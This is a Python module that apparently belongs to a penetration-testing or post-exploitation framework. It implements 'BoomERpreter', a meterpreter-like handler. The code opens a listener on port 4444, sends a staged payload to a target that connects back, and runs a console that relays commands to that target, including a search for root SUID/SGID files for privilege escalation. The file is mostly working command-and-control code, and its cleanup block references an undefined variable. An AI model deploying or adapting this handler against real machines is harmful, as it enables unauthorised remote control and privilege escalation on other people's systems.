import socket
import sys
from threading import Thread
import struct
import time
from module import Module
from os import sep
import pickle

class BoomerModule(Module):
    def __init__(self):
        info = {"Name": "BoomERpreter",
                "Author": "Josue Encinar",
                "Description": "Open a channel to interact with a targer",
                }
        options = {
            "lport": ["Open a local port to receive the connection", 4444, True],
            "lhost": ["Local host to receive the connection", "192.168.206.128", True]
            }
        self.meterpreter_functions = {
            "help": {
                "function":"help",
                "help":"Show this help.",
                "execute": "help",
                "exec": False},
                "exit": {
                "function":"exit",
                "help":"Close BoomERpreter",
                "execute": "exit",
                "exec": False},
            "suid_sgid": {
                "function": "check_result",
                "help": "Find root SUID_SGID files",
                "execute":"suid_sgid <path>", 
                "exec": True}
        }
        self.completer = None
        self.running = False
        self.sock = None
        self.client = None
        super(BoomerModule, self).__init__(options,info)
    
    def set_completer(self, completer):
        self.completer = completer
        self.completer.set_backup()
               
    def run(self):
        # Create a TCP/IP socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(8)
        # Bind the socket to the port
        server_address = (self.options["lhost"][1], int(self.options["lport"][1]))
        print('starting up on %s port %s' % server_address)
        self.sock.bind(server_address)
        # Listen for incoming connections
        self.sock.listen(1)
        try:
            print('waiting for a connection')
            self.client, client_address = self.sock.accept()
            try:
                print('Sending BoomErpreter', client_address)
                file_boomer = ("support%sboomerpreter%sboomerpreter.py" % (sep,sep))
                meterpreter = open(file_boomer, "r").read()
                meterpreter = meterpreter.encode()
                l = struct.pack('>I', len(meterpreter))
                self.client.send(l)
                c = self.client.send(meterpreter)
                if c == 0:
                    return
                print("Send --> ", c)
                commands = []
                for k, v in self.meterpreter_functions.items():
                    commands.append(k)
                self.completer.set_all_commands(commands,[])
                self.running = True
                while True:
                    if not self.running:
                        self.client.close()
                        self.sock.close()
                        break
                    try:
                        data_input = input(chr(27)+"[1;33m"+"BoomERpreter >> " +chr(27)+"[0m")
                        if data_input == "":
                            continue

                        split_data = data_input.split()
                        opt = self.meterpreter_functions[split_data[0]]
                        if not opt:
                            continue
                        if not opt["exec"]:
                            getattr(self, opt["function"])()
                            continue
                        self.client.send(data_input.encode())
                        data = self.client.recv(4096)
                        print(data)
                        if data:
                            print("DATA")
                            if "Error" in data.decode():
                                self.print_error("[-] Wrong input: " + data_input)
                            else:
                                getattr(self, opt["function"])(data.decode())
                        else:
                            print("NO DATA")
                    except Exception as e:
                        self.print_error(str(e))
                        if "Broken pipe" in str(e):
                            self.print_info("Meterpreter closed")
                            self.completer.restore_backup()
                            return
                #t.join()
            except Exception as e:
                print(str(e))
            finally:
                connection.close()
        except:
            pass
        finally:
            self.sock.close()
        
    def check_result(self, result):
        data = result.split("++")
        suid = data[0].split(";")
        self.print_info("SUID")
        for s in suid:
            print(s)
        if len(data) > 1:
            sgid = data[1].split(";")
            self.print_info("SGID")
            for s in sgid:
                print(s)
    
    def help(self):
        for k,v in self.meterpreter_functions.items():
            self.print_info(k + ": " + v["help"])
            print("   |_ Execute: " + v["execute"])
    
    def exit(self):
        self.completer.restore_backup()
        self.running = False